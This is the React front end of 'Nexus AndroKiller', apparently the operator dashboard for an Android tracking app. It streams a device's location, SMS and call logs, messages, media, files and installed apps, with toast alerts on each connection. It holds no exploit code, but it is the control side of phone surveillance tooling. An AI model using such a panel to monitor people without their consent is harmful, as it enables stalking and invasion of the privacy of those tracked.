import React, { useState, useEffect, useRef } from 'react';
import Header from './components/Header';
import DashboardView from './components/DashboardView';
import WaitingForDevice from './components/WaitingForDevice';
import FirebaseSetupModal from './components/FirebaseSetupModal';
import StorageSettingsModal from './components/StorageSettingsModal';
import DeleteDeviceModal from './components/DeleteDeviceModal';
import BackToTop from './components/BackToTop';
import { Bell, CheckCircle2, PhoneCall, MessageSquare, Info, X } from 'lucide-react';
import {
  subscribeToDevices,
  subscribeToDeviceLocations,
  subscribeToDeviceLogs,
  subscribeToDeviceMedia,
  subscribeToDeviceMessages,
  subscribeToDeviceFiles,
  subscribeToCallLogs,
  subscribeToSmsLogs,
  subscribeToInstalledApps,
  subscribeToStorageConfig,
  deleteDevice
} from './services/trackerService';

// Web Audio API Synthesizer Notification Sound
const playNotificationChime = () => {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    if (ctx.state === 'suspended') {
      ctx.resume();
    }
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';

    const now = ctx.currentTime;
    // High-tech pleasant two-pitch chime (880Hz A5 -> 1320Hz E6)
    osc.frequency.setValueAtTime(880, now);
    osc.frequency.exponentialRampToValueAtTime(1320, now + 0.12);

    gain.gain.setValueAtTime(0.2, now);
    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.45);

    osc.connect(gain);
    gain.connect(ctx.destination);

    osc.start(now);
    osc.stop(now + 0.45);
  } catch (err) {
    console.debug('Notification audio chime error:', err);
  }
};

export default function App() {
  const [devices, setDevices] = useState([]);
  const [simulatedDevice, setSimulatedDevice] = useState(null);
  const [selectedDeviceId, setSelectedDeviceId] = useState(null);
  const [locations, setLocations] = useState([]);
  const [logs, setLogs] = useState([]);
  const [media, setMedia] = useState([]);
  const [messages, setMessages] = useState([]);
  const [files, setFiles] = useState([]);
  const [callLogs, setCallLogs] = useState([]);
  const [smsLogs, setSmsLogs] = useState([]);
  const [installedAppsData, setInstalledAppsData] = useState(null);
  const [isSetupModalOpen, setIsSetupModalOpen] = useState(false);
  const [isStorageModalOpen, setIsStorageModalOpen] = useState(false);
  const [storageConfig, setStorageConfig] = useState({ provider: 'INLINE' });
  const [activeToasts, setActiveToasts] = useState([]);
  const [deviceToDelete, setDeviceToDelete] = useState(null);
  const [isDeletingDevice, setIsDeletingDevice] = useState(false);

  const isInitialLoad = useRef(true);
  const knownDeviceIdsRef = useRef(new Set());

  // Helper to add real-time notification toast with audio chime
  const addToast = (title, message, iconType = 'info') => {
    playNotificationChime();
    const id = Date.now() + Math.random();
    setActiveToasts(prev => [
      { id, title, message, iconType, time: new Date().toLocaleTimeString() },
      ...prev.slice(0, 3)
    ]);
    setTimeout(() => {
      setActiveToasts(prev => prev.filter(t => t.id !== id));
    }, 6000);
  };

  const handleSimulateDevice = () => {
    const demoDev = {
      id: 'dev_preview_nexus',
      deviceId: 'dev_preview_nexus',
      deviceName: 'Pixel 9 Pro (Demo)',
      model: 'Pixel 9 Pro',
      manufacturer: 'Google',
      osVersion: 'Android 15',
      batteryLevel: 92,
      isCharging: true,
      isOnline: true,
      monitoringActive: true,
      updateIntervalSeconds: 15,
      lastSeen: new Date(),
      storageInfo: {
        totalStorageGB: 128.0,
        usedStorageGB: 46.2,
        freeStorageGB: 81.8,
        storagePercentUsed: 36,
        totalRamGB: 8.0,
        freeRamGB: 3.4
      },
      guardianPhoneNumber: "+18005550199",
      permissions: {
        location_fine: true,
        location_background: true,
        audio_record: true,
        camera: true,
        notifications: true
      }
    };
    setSimulatedDevice(demoDev);
    setSelectedDeviceId('dev_preview_nexus');
    addToast('🟢 Android Connected', 'Pixel 9 Pro (Demo) connection established', 'info');
  };

  const handleConfirmDeleteDevice = async (device) => {
    if (!device) return;
    const targetId = device.deviceId || device.id;
    const devName = device.deviceName || targetId;

    if (targetId === 'dev_preview_nexus') {
      setSimulatedDevice(null);
      setSelectedDeviceId(null);
      addToast('Device Disconnected', 'Simulated demo connection ended', 'info');
      setDeviceToDelete(null);
      return;
    }

    try {
      setIsDeletingDevice(true);
      await deleteDevice(targetId);

      // Local state update for immediate feedback
      setDevices(prev => {
        const next = prev.filter(d => (d.deviceId || d.id) !== targetId);
        if (selectedDeviceId === targetId) {
          setSelectedDeviceId(next.length > 0 ? (next[0].deviceId || next[0].id) : null);
        }
        return next;
      });

      addToast('Device Removed', `${devName} was removed from the dashboard`, 'info');
      setDeviceToDelete(null);
    } catch (err) {
      console.error('Delete device error:', err);
      addToast('Error Removing Device', err.message || 'Failed to remove device', 'error');
    } finally {
      setIsDeletingDevice(false);
    }
  };

  // Subscribe to storage configuration
  useEffect(() => {
    const unsub = subscribeToStorageConfig(setStorageConfig);
    return () => unsub && unsub();
  }, []);

  // 1. Subscribe to active Android devices in real-time
  useEffect(() => {
    const unsubscribeDevices = subscribeToDevices((activeDevs) => {
      const currentIds = new Set(activeDevs.map(d => d.deviceId || d.id));

      // Alert when a new Android device establishes connection
      activeDevs.forEach(d => {
        const id = d.deviceId || d.id;
        if (!knownDeviceIdsRef.current.has(id)) {
          const name = d.deviceName || id;
          addToast('🟢 Android Connected', `${name} is now online & connected!`, 'info');
        }
      });

      // Alert when an Android device disconnects / closes
      knownDeviceIdsRef.current.forEach(id => {
        if (!currentIds.has(id)) {
          addToast('⚪ Connection Closed', `Device ${id} disconnected`, 'info');
        }
      });

      knownDeviceIdsRef.current = currentIds;
      setDevices(activeDevs);

      // Auto-update selected device
      setSelectedDeviceId(currentSelected => {
        const allVisible = simulatedDevice ? [simulatedDevice, ...activeDevs] : activeDevs;
        if (allVisible.length === 0) return null;
        if (!currentSelected || !allVisible.some(d => (d.deviceId || d.id) === currentSelected)) {
          return allVisible[0].deviceId || allVisible[0].id;
        }
        return currentSelected;
      });
    });

    return () => unsubscribeDevices();
  }, [simulatedDevice]);

  // Combine real devices with simulated device if active
  const allVisibleDevices = simulatedDevice
    ? [simulatedDevice, ...devices.filter(d => (d.deviceId || d.id) !== simulatedDevice.deviceId)]
    : devices;

  // Smoothly scroll to top when changing active device
  useEffect(() => {
    try {
      window.scrollTo({
        top: 0,
        left: 0,
        behavior: 'smooth'
      });
    } catch {
      window.scrollTo(0, 0);
    }
  }, [selectedDeviceId]);

  const activeDevice = allVisibleDevices.find(d => (d.deviceId || d.id) === selectedDeviceId) || (allVisibleDevices.length > 0 ? allVisibleDevices[0] : null);
  const activeDeviceId = activeDevice ? (activeDevice.deviceId || activeDevice.id) : null;

  // 2. Subscribe to active device's real-time telemetry feeds
  useEffect(() => {
    if (!activeDeviceId) {
      setLocations([]);
      setLogs([]);
      setMedia([]);
      setMessages([]);
      setFiles([]);
      setCallLogs([]);
      setSmsLogs([]);
      setInstalledAppsData(null);
      return;
    }

    const unsubLocations = subscribeToDeviceLocations(activeDeviceId, (locs) => {
      setLocations(locs);
    });

    const unsubLogs = subscribeToDeviceLogs(activeDeviceId, (newLogs) => {
      setLogs(newLogs);
      if (!isInitialLoad.current && newLogs.length > 0) {
        const topLog = newLogs[0];
        addToast(topLog.eventType || 'Device Alert', topLog.message || 'System status update', 'info');
      }
      isInitialLoad.current = false;
    });

    const unsubMedia = subscribeToDeviceMedia(activeDeviceId, setMedia);
    const unsubMessages = subscribeToDeviceMessages(activeDeviceId, setMessages);
    const unsubFiles = subscribeToDeviceFiles(activeDeviceId, setFiles);
    const unsubCallLogs = subscribeToCallLogs(activeDeviceId, setCallLogs);
    const unsubSmsLogs = subscribeToSmsLogs(activeDeviceId, setSmsLogs);
    const unsubApps = subscribeToInstalledApps(activeDeviceId, setInstalledAppsData);

    return () => {
      unsubLocations();
      unsubLogs();
      unsubMedia();
      unsubMessages();
      unsubFiles();
      unsubCallLogs();
      unsubSmsLogs();
      unsubApps();
    };
  }, [activeDeviceId]);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col selection:bg-cyan-500 selection:text-black overflow-x-hidden relative">
      {/* Ambient Glassmorphic Glow Orbs */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div className="absolute -top-32 -left-32 w-80 sm:w-96 h-80 sm:h-96 bg-cyan-500/10 rounded-full blur-[110px] pointer-events-none" />
        <div className="absolute top-1/3 -right-32 w-80 sm:w-96 h-80 sm:h-96 bg-purple-600/10 rounded-full blur-[120px] pointer-events-none" />
        <div className="absolute -bottom-32 left-1/4 w-80 sm:w-96 h-80 sm:h-96 bg-blue-600/10 rounded-full blur-[110px] pointer-events-none" />
      </div>

      {/* Real-time Floating Alert Toasts Container (Mobile responsive top positioning) */}
      <div className="fixed top-2 left-2 right-2 sm:left-auto sm:right-4 z-50 flex flex-col space-y-2 max-w-sm sm:w-full pointer-events-none p-1 sm:p-2">
        {activeToasts.map(toast => (
          <div
            key={toast.id}
            className="pointer-events-auto bg-slate-900/90 border border-cyan-500/40 rounded-2xl p-3 sm:p-3.5 shadow-2xl backdrop-blur-xl ring-1 ring-white/10 flex items-start space-x-3 animate-slide-in"
          >
            <div className="p-2 rounded-xl bg-cyan-950/70 border border-cyan-500/40 text-cyan-400 shrink-0">
              <Bell className="w-4 h-4 animate-bounce" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center justify-between">
                <span className="font-bold text-xs text-white truncate">{toast.title}</span>
                <span className="text-[10px] text-slate-400 font-mono ml-1">{toast.time}</span>
              </div>
              <p className="text-[11px] text-slate-300 mt-0.5 line-clamp-2">{toast.message}</p>
            </div>
            <button
              onClick={() => setActiveToasts(prev => prev.filter(t => t.id !== toast.id))}
              className="text-slate-400 hover:text-white p-1 shrink-0"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          </div>
        ))}
      </div>

      <Header
        devices={allVisibleDevices}
        selectedDeviceId={activeDeviceId}
        onSelectDevice={setSelectedDeviceId}
        onOpenSetupModal={() => setIsSetupModalOpen(true)}
        onOpenStorageModal={() => setIsStorageModalOpen(true)}
        onRequestDeleteDevice={(dev) => {
          if ((dev?.deviceId || dev?.id) === 'dev_preview_nexus') {
            setSimulatedDevice(null);
            setSelectedDeviceId(null);
            addToast('Simulated Device Removed', 'Demo connection closed', 'info');
          } else {
            setDeviceToDelete(dev);
          }
        }}
        storageConfig={storageConfig}
      />

      <main className="flex-1 max-w-7xl w-full mx-auto p-2 sm:p-6 lg:p-8 relative z-10 pb-20 sm:pb-8">
        {activeDevice ? (
          <DashboardView
            currentDevice={activeDevice}
            locations={locations}
            logs={logs}
            media={media}
            messages={messages}
            files={files}
            callLogs={callLogs}
            smsLogs={smsLogs}
            installedAppsData={installedAppsData}
            onRequestDeleteDevice={(dev) => {
              if ((dev?.deviceId || dev?.id) === 'dev_preview_nexus') {
                setSimulatedDevice(null);
                setSelectedDeviceId(null);
                addToast('Simulated Device Removed', 'Demo connection closed', 'info');
              } else {
                setDeviceToDelete(dev);
              }
            }}
          />
        ) : (
          <WaitingForDevice
            onOpenSetupModal={() => setIsSetupModalOpen(true)}
            onOpenStorageModal={() => setIsStorageModalOpen(true)}
            onSimulateDevice={handleSimulateDevice}
          />
        )}
      </main>

      <footer className="border-t border-slate-900/80 bg-slate-950/80 backdrop-blur-md py-3 sm:py-4 px-4 text-center text-[10px] sm:text-xs text-slate-500 font-mono relative z-10 hidden sm:block">
        Nexus AndroKiller • Native Kotlin Android Tracker & React Control Hub
      </footer>

      <FirebaseSetupModal
        isOpen={isSetupModalOpen}
        onClose={() => setIsSetupModalOpen(false)}
      />

      <StorageSettingsModal
        isOpen={isStorageModalOpen}
        onClose={() => setIsStorageModalOpen(false)}
        currentConfig={storageConfig}
      />

      <DeleteDeviceModal
        isOpen={Boolean(deviceToDelete)}
        device={deviceToDelete}
        onClose={() => !isDeletingDevice && setDeviceToDelete(null)}
        onConfirm={handleConfirmDeleteDevice}
        isDeleting={isDeletingDevice}
      />

      <BackToTop />
    </div>
  );
}
